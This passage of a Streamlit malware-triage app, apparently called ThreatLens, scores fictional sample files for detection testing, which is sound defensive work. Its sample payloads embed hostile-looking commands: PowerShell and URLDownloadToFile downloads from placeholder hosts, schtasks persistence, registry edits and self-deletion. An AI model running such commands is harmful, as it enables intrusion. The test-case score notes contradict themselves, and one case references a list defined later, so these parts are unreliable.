    "Results are clearly marked SIMULATED and do not represent real files."
)

# Define 7 test cases covering all rule paths
TICE_TEST_CASES = [
    # 1 — clean file: no rules fire
    {
        "name":    "clean_document.txt",
        "content": b"This is a perfectly normal text file. No threats here.",
        "note":    "Expected: Low (0 pts) — no rules fire",
    },
    # 2 — dangerous extension only
    {
        "name":    "setup.bat",
        "content": b"@echo off\necho Hello World\n",
        "note":    "Expected: Medium (15 pts) — dangerous extension",
    },
    # 3 — double extension
    {
        "name":    "invoice.pdf.exe",
        "content": b"\x4d\x5a\x90\x00" + b"\x00" * 50,
        "note":    "Expected: High (15+25+40 = 80 pts, cap 100) — double ext + sig mismatch... "
                   "actually dangerous_ext + double_ext + sig_mismatch = 15+25+40 = 80 → Critical",
    },
    # 4 — signature mismatch only (.jpg with PE header)
    {
        "name":    "photo.jpg",
        "content": b"\x4d\x5a\x90\x00" + b"\x00" * 50,
        "note":    "Expected: High (40 pts sig_mismatch + 15 dangerous_ext = 55 → High). "
                   "Wait: .jpg is NOT a dangerous ext. So 40 pts only → High.",
    },
    # 5 — suspicious strings (3+)
    {
        "name":    "helper.ps1",
        "content": (
            b"powershell.exe -Command DownloadString\n"
            b"schtasks /create\n"
            b"reg add HKLM\n"
            b"cmd.exe /c del %0\n"
        ),
        "note":    "Expected: High — dangerous ext(15) + sus_strings_high(20) = 35 → Medium. "
                   "Recalc: .ps1 dangerous(15) + sus_strings_high(20) = 35 → Medium",
    },
    # 6 — known hash match (uses dropper.exe payload)
    {
        "name":    "unknown_tool.bin",
        "content": SAMPLE_FILES[9]["content"] if True else b"",  # same bytes as dropper.exe
        "note":    "Expected: Critical — known_hash(35) + sig_mismatch(.bin≠PE? no mismatch) "
                   "+ dangerous_ext(.bin not dangerous) + sus_strings_high(20) = 55+ → High/Critical",
    },
    # 7 — high entropy
    {
        "name":    "encrypted_blob.bin",
        "content": bytes([(i * 251 + 97) % 256 for i in range(2048)]),
        "note":    "Expected: Low/Medium — high_entropy only",
    },
]

if "tice_tests_run" not in st.session_state:
    st.session_state.tice_tests_run = False

if st.button("🧬 Generate Test Cases", use_container_width=False):
    new_findings = []
    for tc in TICE_TEST_CASES:
        result = run_tice(tc["content"], tc["name"], KNOWN_TEST_HASHES)
        result["simulated"] = True
        new_findings.append(result)

    # Only add test cases not already present (prevent duplicate runs)
    existing_keys = {(f["filename"], f["sha256"]) for f in st.session_state.tice_findings}
    added = 0
    for r in new_findings:
        key = (r["filename"], r["sha256"])
        if key not in existing_keys:
            st.session_state.tice_findings.append(r)
            st.session_state.tice_analysed += 1
            if r["classification"] in ("Medium", "High", "Critical"):
                st.session_state.tice_review += 1
            if r["classification"] == "High":
                st.session_state.tice_high += 1
            if r["classification"] == "Critical":
                st.session_state.tice_critical += 1
            added += 1

    st.session_state.tice_tests_run = True
    st.rerun()

# ── TICE findings table ───────────────────────────────────────────────────
if st.session_state.tice_findings:
    st.markdown("#### 📊 Investigation Findings")

    badge_map = {
        "Low":      ("✅ Low",      "badge-low"),
        "Medium":   ("⚠️ Medium",  "badge-medium"),
        "High":     ("🚨 High",    "badge-high"),
        "Critical": ("🔴 Critical","badge-critical"),
    }

    # Summary table
    rows = []
    for f in st.session_state.tice_findings:
        label, _ = badge_map[f["classification"]]
        sim_tag  = " 🔬" if f.get("simulated") else ""
        rule_names = ", ".join(r["name"] for r in f["triggered"]) or "None"
        rows.append({
            "File Name":        f["filename"] + sim_tag,
            "Detected Type":    f["magic_type"],
            "SHA-256 (short)":  f["sha256"][:20] + "…",
            "Triggered Rules":  rule_names,
            "Score":            f"{f['score']} / 100",
            "Classification":   label,
            "Next Step":        f["recommendation"][:60] + "…"
                                if len(f["recommendation"]) > 60
                                else f["recommendation"],
        })
    st.table(rows)
    st.caption("🔬 = simulated test case  |  All other entries = real uploaded files")

    # Detailed expanders for each finding
    st.markdown("#### 🔎 Detailed Findings")
    for f in st.session_state.tice_findings:
        label, badge_cls = badge_map[f["classification"]]
        sim_tag = " **[SIMULATED]**" if f.get("simulated") else ""
        with st.expander(
            f"{label}  {f['filename']}{' 🔬' if f.get('simulated') else ''}  "
            f"— Score: {f['score']}/100"
        ):
            col_a, col_b = st.columns(2)
            with col_a:
                st.markdown(
                    f"""
                    | Property | Value |
                    |---|---|
                    | **File** | `{f['filename']}`{sim_tag} |
                    | **SHA-256** | `{f['sha256'][:32]}…` |
                    | **Size** | {f['file_size']:,} bytes |
                    | **Detected Type** | {f['magic_type']} |
                    | **Entropy** | {f['entropy']} bits/byte |
                    | **Analysed At** | {f['analysed_at']} |
                    """
                )
            with col_b:
                st.markdown(
                    f"""
                    <div style='margin-bottom:8px'>
                      <span class='badge {badge_cls}'>{label}</span>
                      &nbsp; <strong style='font-size:22px'>{f['score']}</strong>
                      <span style='color:#8b949e'> / 100</span>
                    </div>
                    """,
                    unsafe_allow_html=True,
                )
                st.markdown("**Triggered Rules:**")
                if f["triggered"]:
                    for rule in f["triggered"]:
                        st.markdown(
                            f"- **+{rule['points']} pts** — {rule['name']}  \n"
                            f"  <span style='color:#8b949e;font-size:12px'>"
                            f"{rule['description']}</span>",
                            unsafe_allow_html=True,
                        )
                else:
                    st.success("No rules triggered — file passed all checks.")

            st.info(f"**Recommended Next Step:** {f['recommendation']}")

    # ── TICE report download ──────────────────────────────────────────────
    st.markdown("#### 📥 Download Investigation Report")
    tice_report = build_tice_report(st.session_state.tice_findings, KNOWN_TEST_HASHES)
    st.download_button(
        label="⬇ Download TICE Report (.txt)",
        data=tice_report.encode("utf-8"),
        file_name=f"tice_report_{datetime.datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt",
        mime="text/plain",
    )

# ════════════════════════════════════════════════════════════════════════════
#  UI — SAMPLE DATA LAB
# ════════════════════════════════════════════════════════════════════════════

st.markdown("---")
st.markdown("### 🧪 Sample Data Lab")
st.markdown(
    "<p style='color:#8b949e; font-size:13px;'>"
    "These are <strong>fictional test records</strong> used to demonstrate the "
    "application's detection rules. No real files are scanned or executed. "
    "Results are produced by running the same analysis logic used for uploaded files."
    "</p>",
    unsafe_allow_html=True,
)

# ── 10 fictional test files ───────────────────────────────────────────────
# Each entry is a dict that mimics what analyse_file() would receive.
# "content" is a small bytes payload carefully crafted to trigger (or not
# trigger) specific detection rules — no real malware, just pattern bytes.
SAMPLE_FILES = [
    {
        "name": "readme.txt",
        "content": b"Hello, this is a plain text document.\nNothing suspicious here.\n",
    },
    {
        "name": "holiday_photo.jpg",
        # Real JPEG magic bytes — clean image, no mismatch
        "content": b"\xff\xd8\xff\xe0" + b"\x00" * 200,
    },
    {
        "name": "project_report.pdf",
        # Real PDF magic bytes
        "content": b"%PDF-1.4\n%Some fictional PDF content.\n",
    },
    {
        "name": "invoice.docx",
        # ZIP/Office magic (OOXML is a ZIP internally) — clean
        "content": b"\x50\x4b\x03\x04" + b"\x00" * 200,
    },
    {
        "name": "backup_tool.exe",
        # Windows PE magic — dangerous extension matches content (honest EXE)
        "content": b"\x4d\x5a\x90\x00" + b"\x00" * 200,
    },
    {
        "name": "photo_vacation.jpg",
        # EXTENSION MISMATCH: .jpg extension but PE/EXE magic bytes inside
        # Classic malware disguise technique
        "content": b"\x4d\x5a\x90\x00This looks like an image but is actually an executable.",
    },
    {
        "name": "update_script.ps1",
        # PowerShell script with suspicious keywords
        "content": (
            b"# Fictional update script\n"
            b"powershell.exe -Command DownloadString('http://example.com/payload')\n"
            b"$client = New-Object System.Net.WebClient\n"
            b"schtasks /create /tn 'Update' /tr 'cmd.exe'\n"
            b"reg add HKCU\\Software\\Microsoft\\Windows\n"
        ),
    },
    {
        "name": "data_dump.bin",
        # High-entropy binary blob — simulates encrypted or packed data
        # Generated by cycling pseudo-random bytes (no actual secrets)
        "content": bytes([(i * 131 + 73) % 256 for i in range(1024)]),
    },
    {
        "name": "safe_document.pdf",
        # EXTENSION MISMATCH: .pdf extension but ZIP magic inside
        "content": b"\x50\x4b\x03\x04" + b"This archive is pretending to be a PDF.",
    },
    {
        "name": "dropper.exe",
        # PE magic + multiple suspicious strings — highest risk score
        "content": (
            b"\x4d\x5a\x90\x00"
            b"powershell.exe -EncodedCommand "
            b"URLDownloadToFile http://malicious.example/payload.exe "
            b"cmd.exe /c schtasks /create "
            b"reg add HKLM\\Software "
            b"ShellExecute CreateProcess "
            b"password=admin del %0"
        ),
    },
]

# ── Wire the real hashes into KNOWN_TEST_HASHES now that SAMPLE_FILES exists ─
# This replaces the placeholder keys with the actual SHA-256 of each payload.
KNOWN_TEST_HASHES = {
    sha256_hash(SAMPLE_FILES[9]["content"]): "FICTIONAL — dropper.exe test payload",
    sha256_hash(SAMPLE_FILES[5]["content"]): "FICTIONAL — photo_vacation.jpg mismatch payload",
}


def analyse_sample(sample: dict) -> dict:
    """
    Run the same detection logic as analyse_file() but on a fictional
    in-memory bytes payload instead of a real uploaded file.
    Returns a result dict identical in shape to analyse_file().
    """
    data     = sample["content"]
    filename = sample["name"]
    ext      = Path(filename).suffix.lower()

    file_hash    = sha256_hash(data)
    entropy      = calculate_entropy(data)
    magic_type   = detect_magic(data)
    mismatch     = check_extension_mismatch(filename, magic_type)
    sus_strings  = find_suspicious_strings(data)
    dangerous_ext = ext in DANGEROUS_EXTENSIONS

    risk_level, explanation = determine_risk(
        entropy, dangerous_ext, sus_strings, mismatch
    )

    return {
        "filename":      filename,
        "file_size":     len(data),
        "sha256":        file_hash,
        "entropy":       entropy,
        "magic_type":    magic_type or "Unknown / plain text",
        "extension":     ext or "(none)",
        "dangerous_ext": dangerous_ext,
        "mismatch":      mismatch,
        "sus_strings":   sus_strings,
        "risk_level":    risk_level,
        "explanation":   explanation,
        "scanned_at":    "SIMULATED — not a real scan",
    }


# ── Session state for sample results ─────────────────────────────────────
if "sample_generated" not in st.session_state:
    st.session_state.sample_generated = False
if "sample_results"   not in st.session_state:
    st.session_state.sample_results   = []
if "sample_analysed"  not in st.session_state:
    st.session_state.sample_analysed  = False

# ── Button row ────────────────────────────────────────────────────────────
btn_col1, btn_col2, _ = st.columns([1, 1, 3])

with btn_col1:
    if st.button("📋 Generate Sample Data", use_container_width=True):
        st.session_state.sample_generated = True
        st.session_state.sample_analysed  = False   # reset analysis view
        st.session_state.sample_results   = []

with btn_col2:
    run_disabled = not st.session_state.sample_generated
    if st.button(
        "🔬 Run Security Analysis",
        use_container_width=True,
        disabled=run_disabled,
    ):
        results = [analyse_sample(s) for s in SAMPLE_FILES]
        st.session_state.sample_results  = results
        st.session_state.sample_analysed = True

        # ── Update the top 4 stat cards with sample results ──────────────
        for r in results:
            st.session_state.total_scanned += 1
            if r["risk_level"] == "Low":
                st.session_state.low_risk += 1
            elif r["risk_level"] == "Medium":
                st.session_state.suspicious += 1
            else:
                st.session_state.high_risk += 1

        # Rerun so the stat cards at the top re-render with new counts
        st.rerun()

# ── Sample data table ─────────────────────────────────────────────────────
if st.session_state.sample_generated:
    st.markdown("#### 📄 Fictional Test File Records")
    st.caption(
        "⚠ These are simulated test records only. "
        "SHA-256 hashes are real hashes of the fictional payloads, not real files."
    )

    # Build a simple summary table (no analysis results yet)
    table_rows = []
    for s in SAMPLE_FILES:
        data = s["content"]
        ext  = Path(s["name"]).suffix.lower()
        magic = detect_magic(data) or "Unknown / plain text"
        h    = sha256_hash(data)
        table_rows.append({
            "File Name":       s["name"],
            "Extension":       ext or "(none)",
            "Detected Type":   magic,
            "SHA-256 (short)": h[:20] + "…",
            "Size (bytes)":    len(data),
        })

    st.table(table_rows)

# ── Security analysis results ─────────────────────────────────────────────
if st.session_state.sample_analysed and st.session_state.sample_results:
    st.markdown("#### 🔍 Security Analysis Results")
    st.caption(
        "Risk levels are assigned by the same detection rules used for real uploads — "
        "not randomly generated."
    )

    # Colour-coded summary table
    summary_rows = []
    for r in st.session_state.sample_results:
        icon = {"Low": "✅ Low", "Medium": "⚠️ Medium", "High": "🚨 High"}[r["risk_level"]]
        summary_rows.append({
            "File Name":    r["filename"],
            "Risk Level":   icon,
            "Entropy":      r["entropy"],
            "Magic Type":   r["magic_type"],
            "Findings":     r["explanation"],
        })

    st.table(summary_rows)

    # Detailed cards for Medium and High risk files only
    flagged = [r for r in st.session_state.sample_results
               if r["risk_level"] in ("Medium", "High")]

    if flagged:
        st.markdown("#### 🚩 Flagged Files — Detailed Breakdown")
        for r in flagged:
            badge_class = "badge-medium" if r["risk_level"] == "Medium" else "badge-high"
            risk_icon   = "⚠️" if r["risk_level"] == "Medium" else "🚨"

            st.markdown(
                f"""
                <div class="result-card">
                  <div style="display:flex; justify-content:space-between; align-items:center;">
                    <span style="font-size:16px; font-weight:600;">
                      {risk_icon} {r['filename']}
                    </span>
                    <span class="badge {badge_class}">{r['risk_level']} Risk</span>
                  </div>
                  <p style="color:#8b949e; font-size:13px; margin:8px 0 4px;">
                    {r['explanation']}
                  </p>
                </div>
                """,
                unsafe_allow_html=True,
            )

            # Show mismatch warning if present
            if r["mismatch"]:
                st.error(r["mismatch"])

            # Show suspicious strings if present
            if r["sus_strings"]:
                with st.expander(
                    f"🕵️ {len(r['sus_strings'])} suspicious pattern(s) in {r['filename']}"
                ):
                    for s in r["sus_strings"]:
                        st.markdown(f"- {s}")

            st.markdown("<br>", unsafe_allow_html=True)

    else:
        st.success("No medium or high-risk files found in the sample set.")

# ── Footer ───────────────────────────────────────────────────────────────────
st.markdown(
    """
    <br><hr>
    <p style='text-align:center; color:#30363d; font-size:12px;'>
        ThreatLens • Static analysis only — files are never executed or stored
    </p>
    """,
    unsafe_allow_html=True,
)
